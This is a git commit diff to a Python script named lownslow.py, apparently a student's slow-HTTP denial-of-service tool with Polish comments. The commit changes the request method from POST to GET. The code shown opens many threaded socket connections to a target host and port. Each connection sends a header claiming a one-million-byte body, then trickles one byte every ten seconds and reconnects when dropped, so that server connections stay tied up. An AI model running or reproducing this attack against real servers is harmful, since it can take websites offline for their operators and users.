13e34b5caf13cfd56aa4cff664bf18e2c377f953
mzawieracz@student.agh.edu.pl <mzawieracz@student.agh.edu.pl>
2026-01-28 17:38:53 +0100

    change request method

--- lownslow.py
+++ lownslow.py
@@ -13,9 +13,9 @@ def attack():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(4) # Timeout, żeby wątek nie wisiał na martwym gnieździe
             s.connect((target_host, target_port))
-            
+
             header = (
-                f"POST {path} HTTP/1.1\r\n"
+                f"GET {path} HTTP/1.1\r\n"
                 f"Host: {target_host}\r\n"
                 f"Content-Type: application/x-www-form-urlencoded\r\n"
                 f"Content-Length: 1000000\r\n"
@@ -28,7 +28,6 @@ def attack():
             while True:
                 s.send(b'a')
                 time.sleep(10)
-                
         except socket.error:
             print(f"[!] [Wątek {threading.current_thread().name}] Połączenie przerwane, restartuję...")
             time.sleep(1) # Krótka przerwa przed ponowną próbą
@@ -37,7 +36,7 @@ def attack():
 
 if __name__ == "__main__":
     print(f"Uruchamiam atak na {target_host} przy użyciu {threads_count} wątków...")
-    
+
     threads = []
     for i in range(threads_count):
         t = threading.Thread(target=attack, name=f"Worker-{i}")
